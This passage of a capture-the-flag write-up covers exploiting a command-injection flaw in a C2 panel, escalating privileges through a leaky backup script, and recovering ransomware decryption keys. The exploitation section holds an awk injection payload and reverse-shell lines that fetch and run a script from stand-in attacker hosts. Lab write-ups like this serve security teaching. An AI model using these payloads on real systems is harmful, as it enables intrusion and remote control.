+        title="marine_c2_debug" /></p>
+<p>By intercepting the request made in Burp, we can modify and replay it. Based on the command displayed in the console, we can build a malicious payload to perform an injection resulting in a command execution.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2_command.png"
+        data-srcset="/assets/images/writeups/marine/c2_command.png, /assets/images/writeups/marine/c2_command.png 1.5x, /assets/images/writeups/marine/c2_command.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2_command.png"
+        title="marine_c2_command" /></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;agent_id&#34;</span>:<span class="s2">&#34;1\&#34;) print </span><span class="nv">$4</span><span class="s2">} BEGIN{system(\&#34;/usr/bin/id\&#34;)} {if(</span><span class="nv">$1</span><span class="s2">==\&#34;agent&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>By modifying the injection previously obtained, it is possible to obtain a reverse shell with the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;agent_id&#34;</span>:<span class="s2">&#34;1\&#34;) print </span><span class="nv">$4</span><span class="s2">} BEGIN{system(\&#34;curl http://ip.attaquant.local:4445/exp.sh &gt; /tmp/exp.sh &amp;&amp; /bin/bash /tmp/exp.sh \&#34;)} {if(</span><span class="nv">$1</span><span class="s2">==\&#34;agent&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>And the following exp.sh content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/ip.attacker.local/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2_reverseshell.png"
+        data-srcset="/assets/images/writeups/marine/c2_reverseshell.png, /assets/images/writeups/marine/c2_reverseshell.png 1.5x, /assets/images/writeups/marine/c2_reverseshell.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2_reverseshell.png"
+        title="marine_c2_reverse_shell" /></p>
+<p>The flag is contained in the file <code>flag_3.txt</code> :</p>
+<ul>
+<li><strong>RM{dfbc2fb4c76b315aa6fa06e5f35aef23b1da32f5}</strong></li>
+</ul>
+<h2 id="step-4---privileges-escalation">Step 4 - Privileges Escalation</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission4.png"
+        data-srcset="/assets/images/writeups/marine/mission4.png, /assets/images/writeups/marine/mission4.png 1.5x, /assets/images/writeups/marine/mission4.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission4.png"
+        title="marine_mission4" /></p>
+<p>System enumeration reveals several interesting points:</p>
+<ul>
+<li>A cronjob running <strong>every 5 minutes</strong> in <code>/etc/cron.d/backup</code></li>
+<li>A backup script in <code>/opt/backup.sh</code> launched by the cronjob</li>
+<li>permission preventing you from listing items in <code>/tmp/</code></li>
+<li>A (non-readable) <code>backup</code> folder in the root directory</li>
+<li>An api folder (not readable) at <code>root</code></li>
+<li>A readable log file at <code>/var/log/backup.log</code> written by <code>/opt/backup.sh</code></li>
+</ul>
+<p>Let&rsquo;s start by analyzing the <code>/opt/backup.sh</code> script. This sequence of shell commands saves the secrets (<code>/api/secrets.json</code>) in a <code>/backup</code> folder to which we have no access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/env bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">&#34;/backup&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LOG_FILE</span><span class="o">=</span><span class="s2">&#34;/var/log/backup.log&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">BKP_FILE</span><span class="o">=</span><span class="s2">&#34;/api/secrets.json&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">log<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">log_msg</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="k">$(</span>/usr/bin/date -u<span class="k">)</span><span class="s2"> - </span><span class="si">${</span><span class="nv">log_msg</span><span class="si">}</span><span class="s2">&#34;</span> &gt;&gt; <span class="si">${</span><span class="nv">LOG_FILE</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">backup<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">DATE</span><span class="o">=</span><span class="k">$(</span>/usr/bin/date +%s<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">DIR</span><span class="o">=</span><span class="s2">&#34;/tmp/</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/mkdir -m <span class="m">755</span> -p <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">&amp;&amp;</span> /usr/bin/chown -R administrator:administrator <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Copying secrets file to temporary directory&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/cp <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BKP_FILE</span><span class="si">}</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Compressing secrets file and moving it to backup directory&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/gzip <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json&#34;</span> <span class="o">&amp;&amp;</span> /usr/bin/cp <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json.gz&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json.gz&#34;</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Backup done&#34;</span> 
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Removing temporary directory&#34;</span>
+</span></span><span class="line"><span class="cl">    clear_tmp
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">clear_tmp<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Make sure everything that we have done is deleted from /tmp</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/rm -rf /tmp/*
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Temporary directory cleared&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">log <span class="s2">&#34;Backup script started&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -d <span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Backup directory does not exist, exiting&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>/usr/bin/ls -A <span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span><span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;No backup found, initiating a new backup...&#34;</span>
+</span></span><span class="line"><span class="cl">    backup
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">NEWEST_BKP</span><span class="o">=</span><span class="k">$(</span>/usr/bin/ls -t <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/head -n 1<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">SHA_NEWEST_BKP</span><span class="o">=</span><span class="k">$(</span>/usr/bin/gzip -d -c <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">NEWEST_BKP</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/sha256sum <span class="p">|</span> /usr/bin/awk <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">SHA_LATEST</span><span class="o">=</span><span class="k">$(</span>/usr/bin/sha256sum <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BKP_FILE</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/awk <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">SHA_NEWEST_BKP</span><span class="si">}</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">SHA_LATEST</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        log <span class="s2">&#34;New backup needed, initiating a new backup...&#34;</span>
+</span></span><span class="line"><span class="cl">        backup
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        log <span class="s2">&#34;No new backup needed, exiting&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><p>It performs a series of actions, as follows:</p>
+<ul>
+<li>Check that the <code>/backup</code> folder exists</li>
+<li>Check that a backup does not already exist</li>
+<li>If no backup exists, it creates the backup</li>
+<li>If a backup exists, compare its sum with the current state of secrets</li>
+<li>If the state is the same as the previous backup, then nothing is done</li>
+<li>If the current state of secrets is different from the last backup, then a new backup is launched.</li>
+</ul>
+<p>Let&rsquo;s take a closer look at the <code>backup()</code> and <code>clear_tmp()</code> functions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">backup<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">DATE</span><span class="o">=</span><span class="k">$(</span>/usr/bin/date +%s<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">DIR</span><span class="o">=</span><span class="s2">&#34;/tmp/</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/mkdir -m <span class="m">755</span> -p <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">&amp;&amp;</span> /usr/bin/chown -R administrator:administrator <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Copying secrets file to temporary directory&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/cp <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BKP_FILE</span><span class="si">}</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Compressing secrets file and moving it to backup directory&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/gzip <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json&#34;</span> <span class="o">&amp;&amp;</span> /usr/bin/cp <span class="s2">&#34;</span><span class="si">${</span><span class="nv">DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json.gz&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BACKUP_DIR</span><span class="si">}</span><span class="s2">/secrets_</span><span class="si">${</span><span class="nv">DATE</span><span class="si">}</span><span class="s2">.json.gz&#34;</span>
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Backup done&#34;</span> 
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Removing temporary directory&#34;</span>
+</span></span><span class="line"><span class="cl">    clear_tmp
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">clear_tmp<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Make sure everything that we have done is deleted from /tmp</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/rm -rf /tmp/*
+</span></span><span class="line"><span class="cl">    log <span class="s2">&#34;Temporary directory cleared&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>In the <code>/tmp</code> directory (which, due to permissions, does not allow us to list files/folders), a folder is created with the date in <code>epoch</code> format, with permissions <strong>755</strong> (which means we can read the contents).
+Secrets are then copied into this directory, which we can read, then compressed and copied (without being deleted) to the <code>/backup</code> directory, which is not readable.</p>
+<p>Immediately afterwards, the <code>clear_tmp</code> function is instructed to empty the <code>/tmp</code> directory. However, the author of the script makes a mistake here: since it&rsquo;s not possible to list files in <code>/tmp</code> and the script is run as administrator (not root), use of the wildcard * doesn&rsquo;t work in this context, so no files are actually removed from <code>/tmp/</code>.</p>
+<p>This means that the directory created and the files copied are still present, even after the script has been run.  Correlating:</p>
+<ul>
+<li>The fact that the directory created in <code>/tmp</code> is readable by everyone</li>
+<li>File deletion error due to t permission on <code>/tmp</code> and use of wildcard *.</li>
+<li>The contents of the logs in <code>/var/log/backup.log</code>, which display date and time.</li>
+</ul>
+<p>It is possible to find the name of the folder and file that has been compressed and then read its contents. Looking at the contents of the logs, we find that a backup was made on <code>Tue Feb 11 16:35:00 UTC 2025</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c2-web@a8f3afe5d338:/etc/cron.d$ cat /var/log/backup.log 
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Backup script started
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - No backup found, initiating a new backup...
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Copying secrets file to temporary directory
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Compressing secrets file and moving it to backup directory
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Backup <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Removing temporary directory
+</span></span><span class="line"><span class="cl">Tue Feb <span class="m">11</span> 16:35:00 UTC <span class="m">2025</span> - Temporary directory cleared
+</span></span></code></pre></div><p>This date can be converted to epoch with :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c2-web@a8f3afe5d338:/etc/cron.d$ date -d <span class="s2">&#34;Tue Feb 11 16:35:00 UTC 2025&#34;</span> +%s
+</span></span><span class="line"><span class="cl"><span class="m">1739291700</span>
+</span></span></code></pre></div><p>Then we can go to the folder and list its contents:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c2-web@a8f3afe5d338:/tmp/1739291700$ <span class="nb">cd</span> /tmp/1739291700
+</span></span><span class="line"><span class="cl">c2-web@a8f3afe5d338:/tmp/1739291700$ ls -lahv
+</span></span><span class="line"><span class="cl">total 12K
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root          root          4.0K Feb <span class="m">19</span> 18:49 .
+</span></span><span class="line"><span class="cl">drwxrwx-wt <span class="m">1</span> root          root          4.0K Feb <span class="m">19</span> 19:45 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> administrator administrator  <span class="m">192</span> Feb <span class="m">19</span> 16:28 secrets_1739291700.json.gz
+</span></span></code></pre></div><p>And read the content of secrets :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c2-web@a8f3afe5d338:/tmp/1739291700$ gzip -d -c secrets_1739291700.json.gz 
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;01f4d362ecdd89d26f5f0c5e6b2afe93&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;35319a21dbe2ced1a7da56c2d717bb0d&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;d7a6f9650e30eb65f8f6506c6d170b9a&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">]</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;flag_4&#34;</span>: <span class="s2">&#34;RM{3b62b1a157a85a06423f930058baf3e305292d35}&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span></code></pre></div><ul>
+<li>Flag : <strong>RM{3b62b1a157a85a06423f930058baf3e305292d35}</strong></li>
+</ul>
+<h2 id="step-5---forensic">Step 5 - Forensic</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission5.png"
+        data-srcset="/assets/images/writeups/marine/mission5.png, /assets/images/writeups/marine/mission5.png 1.5x, /assets/images/writeups/marine/mission5.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission5.png"
+        title="marine_mission5" /></p>
+<p>Since we&rsquo;ve already reverse-engineered the malware, we&rsquo;ve reconstructed the key, or at least part of the key. To decrypt the files, we need the following values:</p>
+<ul>
+<li><strong>Static key</strong></li>
+<li><strong>Initialization vector</strong></li>
+<li><strong>Dynamic key</strong></li>
+<li><strong>Encrypted folder name</strong></li>
+<li><strong>Malware launch date</strong></li>
+</ul>
+<h3 id="1-static-key">1. Static key</h3>
+<p>This key is hard-coded into the malware. For example, the malware creates the key as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C#" data-lang="C#"><span class="line"><span class="cl"><span class="k">new</span> <span class="kt">string</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x24</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x32</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x2D</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x44</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x38</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x43</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x31</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x45</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x37</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x42</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x39</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x33</span><span class="p">,</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><h3 id="2-initialization-vector">2. Initialization vector</h3>
+<p>This IV is also hard-coded into the malware. The malware creates the IV as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C#" data-lang="C#"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">string</span> <span class="n">H</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="p">[]</span> <span class="n">a</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[]</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x44</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x31</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x40</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x45</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x32</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x23</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x33</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span> <span class="m">0x25</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x34</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x42</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x35</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x26</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x43</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x36</span><span class="p">,(</span><span class="n">cha</span> <span class="n">r</span><span class="p">)</span><span class="m">0x44</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x31</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x40</span><span class="p">,....</span>
+</span></span></code></pre></div><h3 id="3-dynamic-key">3. Dynamic key</h3>
+<p>This key was obtained when the C2 server was compromised. In the secrets.json file, it appears as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/app <span class="c1"># cat secrets.json </span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;admin&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>...<span class="o">]</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;35319a21dbe2ced1a7da56c2d717bb0d&#34;</span>,
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>...<span class="o">]</span>,
+</span></span><span class="line"><span class="cl">  <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h3 id="4-encrypted-folder-name--malware-launch-date">4. Encrypted folder name &amp; Malware launch date</h3>
+<p>Now that we have these three values, we need to determine the date and folder name used for encryption. This information is essential for reconstructing the key.
+The SOC has recovered the <strong>EVTX</strong> file from the compromised machine. A quick search shows that process creation events are recorded under the ID <code>4688</code>. We can filter according to this ID, then search for a <code>VPNUpdater.exe</code> process.</p>
+<p>After further analysis, we found a process creation event for <code>VPNUpdater.exe</code> which receives a folder parameter corresponding to the <code>\DC01\shares\private</code> share.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/evtx.png"
+        data-srcset="/assets/images/writeups/marine/evtx.png, /assets/images/writeups/marine/evtx.png 1.5x, /assets/images/writeups/marine/evtx.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/evtx.png"
+        title="marine_evtx" /></p>
+<p>This retrieves the two missing pieces of information: the folder name and the timestamp:</p>
+<ul>
+<li><strong>Folder</strong> : <code>\\dc01\shares\private</code></li>
+<li><strong>Date</strong> : <code>2025-02-11T16:28:16Z</code></li>
+</ul>
+<p>We now have all the information we need to create a Python script that takes these values as input, as well as an encrypted file, and decrypts it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_composite_key</span><span class="p">(</span><span class="n">dynamic_key</span><span class="p">,</span> <span class="n">static_key</span><span class="p">,</span> <span class="n">folder</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">input_data</span> <span class="o">=</span> <span class="n">dynamic_key</span> <span class="o">+</span> <span class="n">static_key</span> <span class="o">+</span> <span class="n">folder</span> <span class="o">+</span> <span class="n">timestamp</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sha256</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sha256</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">input_data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sha256</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">encrypted_file_path</span><span class="p">,</span> <span class="n">composite_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">backend</span> <span class="o">=</span> <span class="n">default_backend</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">composite_key</span><span class="p">),</span> <span class="n">modes</span><span class="o">.</span><span class="n">CBC</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">backend</span><span class="o">=</span><span class="n">backend</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
